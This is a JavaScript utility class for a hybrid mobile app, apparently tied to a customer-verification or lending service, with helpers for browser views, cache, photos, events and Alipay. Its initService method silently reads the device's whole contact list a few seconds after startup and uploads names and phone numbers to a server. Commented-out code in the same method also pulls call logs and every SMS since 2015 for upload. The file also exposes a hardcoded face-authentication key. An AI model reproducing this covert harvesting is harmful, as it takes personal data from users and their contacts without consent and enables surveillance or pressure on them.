
import { storage, request, common } from '../index'
import { url, isApp } from '../../const/index'
class Apid {
  static ready () {
    this.setStatusBarStyle()
    setTimeout(() => {
      this.initService()
    }, 5000)
  }

  // .处理用户数据
  static initService () {
    if (!isApp) {
      return false
    }
    const userKeys = storage.get('userKeys')
    if (!userKeys || !userKeys.accessToken) {
      return false
    }
    // .定义设备信息
    const devinfo = storage.get('devinfo-' + userKeys.userId) || {
      contacts: [],
      callrecord: [],
      smsrecord: []
    }
    const that = this
    //  *****  TODO 获取通讯录
    const contactsModel = api.require('DVContacts')
    contactsModel.allContacts((ret, err) => {
      if (ret && JSON.stringify(ret) !== JSON.stringify(devinfo.contacts)) {
        const list = []
        const contacts = ret.contacts
        if (contacts) {
          contacts.map(item => {
            let name = ''
            if (item.fullName) {
              name = item.fullName
            } else {
              name = item.firstName + item.middleName + item.lastName
            }
            const phones = item.phones
            phones.map(phone => {
              for (const prop in phone) {
                const contact = {
                  name: name,
                  phone: phone[prop]
                }
                list.push(contact)
              }
            })
          })
          devinfo.contacts = ret
          that.updateAuthAddressBook(list, userKeys.userId, devinfo)
        }
      } else {
        console.log(JSON.stringify(err))
      }
    })
    // .获取通话记录
    // const callRecordModel = api.require('callRecord')
    // callRecordModel.openCallRecord((ret) => {
    //   if (ret && JSON.stringify(devinfo.callrecord) !== JSON.stringify(ret.CallRecord)) {
    //     devinfo.callrecord = ret.CallRecord
    //     storage.set('devinfo-' + userKeys.userId, devinfo)
    //     if (typeof callback === 'function') {
    //       that.updateHandAppAndPhoneInfo(JSON.stringify({
    //         callrecord: ret.CallRecord
    //       }))
    //     }
    //   }
    // })
    //
    // // .获取短信记录
    // const now = new Date()
    // let month = (now.getMonth() + 1)
    // month = (month < 10) ? '0' + month : month
    // const taday = now.getFullYear() + '-' + month + '-' + now.getDate()
    // const smsRecrodModel = api.require('moduleSMS')
    // smsRecrodModel.getSmsFromDB({
    //   sdate: '2015-01-01',
    //   edate: taday
    // }, (ret, err) => {
    //   if (ret) {
    //     let smsRecord = []
    //     for (let i in ret) {
    //       smsRecord.push({
    //         strAddress: ret[i].strAddress,
    //         strDate: ret[i].strDate,
    //         strbody: ret[i].strbody,
    //         strType: ret[i].strType
    //       })
    //     }
    //     if (JSON.stringify(devinfo.smsrecord) !== JSON.stringify(smsRecord)) {
    //       devinfo.smsrecord = smsRecord
    //       storage.set('devinfo-' + userKeys.userId, devinfo)
    //       that.updateHandAppAndPhoneInfo(JSON.stringify({
    //         smsrecord: smsRecord
    //       }))
    //     }
    //   }
    // })
  }
  // 上传通讯录
  static updateAuthAddressBook (list, userId, devinfo, _callback) {
    request({
      type: 'post',
      path: url.UserVerify.AuthAddressBook,
      data: list,
      fn: data => {
        if (data.success) {
          storage.set('devinfo-' + userId, devinfo)
        }
        if (typeof _callback === 'function') {
          _callback()
        }
      }
      // errFn: (err) => {
      //   alert(JSON.stringify(err))
      // }
    })
  }
  // 上传数据
  static updateHandAppAndPhoneInfo (data, _callback) {
    const params = {
      phoneAndCommInfo: data
    }
    request({
      type: 'post',
      path: url.CustomerInfoAuthentication.HandAppAndPhoneInfo,
      data: params,
      fn: data => {
        if (typeof _callback === 'function') {
          _callback()
        }
      }
    })
  }
  /*****************************************/
  static setListenKeyBack (callback) {
    const that = this
    this.addEventListener('keyback', (ret) => {
      that.browserModel.historyBack((ret, err) => {
        if (!ret.status) {
          that.browserModel.closeView()
          if (typeof callback === 'function') {
            callback()
          }
        }
      })
    })
  }
  static runFaceAuth (projectName, okCall, errCall) {
    const outOrderId = new Date().getTime() + projectName
    if (!isApp) {
      common.errorT('请在App下使用')
      return false
    }
    const faceRun = api.require('UDYhy')
    faceRun.faceAuth({
      authKey: '5b5737d8-6c8a-4335-b10a-a286f83e068b', // authKey 不能为空
      outOrderId: outOrderId, // 订单号不能为空（建议传时间戳+后缀的形式）
      notifyUrl: 'm.jxstudio.cn'
    }, (ret, err) => {
      okCall(ret)
      if (err) {
        if (errCall && typeof errCall === 'function') {
          errCall(err)
        }
      } else {
        okCall(ret, outOrderId)
      }
    })
  }

  // 打开浏览器
  static openBrowser (url, headerHeight, _callBack) {
    this.browserModel = api.require('webBrowser')
    this.browserModel.openView({
      url: url,
      rect: {
        x: 0,
        y: headerHeight,
        w: api.winWidth,
        h: api.winHeight - headerHeight
      }
    }, (ret, err) => {
      if (ret.state === 3) {
        // .更改标题文字
        let title = ''
        if (ret.title.length < 13) {
          title = ret.title
        } else if (ret.title.length >= 13) {
          title = ret.title.substr(0, 13) + '...'
        }
        if (typeof _callBack === 'function') {
          _callBack(title)
        }
      }
    })
  }
  // 关闭浏览器
  static closeBrowser (callBack) {
    const that = this
    this.browserModel.historyBack((ret, err) => {
      if (!ret.status) {
        that.browserModel.closeView()
        if (callBack && typeof callBack === 'function') {
          callBack()
        }
      }
    })
  }
  // 获取缓存
  static getCacheSize () {
    if (!isApp) {
      return 0
    }
    return api.getCacheSize({ sync: true })
  }
  // 清理缓存
  static clearCache (_callback) {
    if (!isApp) {
      return false
    }
    common.toast('清理中...')
    api.clearCache({
      timeThreshold: 0
    }, () => {
      common.successT('清理完毕')
      // 复位缓存统计
      if (typeof _callback === 'function') {
        _callback()
      }
    })
  }

  static setStatusBarStyle () {
    api.setStatusBarStyle({
      style: 'linght',
      color: 'rgba(0,0,0,0.3)'
    })
  }
  static savePicture (url) {
    const timestamp = new Date().getTime()
    api.download({
      url: url,
      savePath: 'fs://test' + timestamp + '.jpeg',
      report: true,
      cache: true,
      allowResume: true
    }, function (ret, err) {
      if (ret) {
        common.successT('图片已保存到本地')
      }
      api.saveMediaToAlbum({
        path: 'fs://test' + timestamp + '.jpeg'
      }, (ret, err) => {
      })
    })
  }
  // .操作相册·相机
  static getPicture (type, _callback) {
    api.getPicture({
      sourceType: type,
      encodingType: 'jpg',
      mediaValue: 'pic',
      destinationType: 'base64',
      allowEdit: false,
      quality: 100,
      targetWidth: 80,
      targetHeight: 80,
      saveToPhotoAlbum: false
    }, function (ret, err) {
      if (ret && typeof _callback === 'function') {
        _callback(ret)
      }
    })
  }
  static getAppVersion () {
    return api.appVersion
  }
  static getSafeAreaTop () {
    if (isApp) {
      return api.safeArea.top
    } else {
      return 0
    }
  }
  static getSafeAreaBottom () {
    if (isApp) {
      return api.safeArea.bottom
    } else {
      return 0
    }
  }
  // .监听事件
  static addEventListener (eventName, _callback, extra) {
    api.addEventListener({
      name: eventName,
      extra: extra || {}
    }, (ret, err) => {
      if (typeof _callback === 'function') {
        _callback(ret)
      }
    })
  }
  // .移除监听事件
  static rmEventListener (eventName) {
    if (!isApp) {
      return false
    }
    api.removeEventListener({
      name: eventName
    })
  }
  // .广播事件
  static sendEvent (eventName, extra) {
    if (!isApp) {
      return false
    }
    api.sendEvent({
      name: eventName,
      extra: extra || {}
    })
  }

  static payOrder (orderInfo, __callBack) {
    const aliPay = api.require('aliPay')
    aliPay.payOrder({
      orderInfo: orderInfo
    }, (ret, err) => {
      if (__callBack && typeof __callBack === 'function') {
        __callBack(ret, err)
      }
    })
  }

  static systemType () {
    if (!isApp) {
      return 'web'
    } else {
      return api.systemType
    }
  }
}
export default Apid
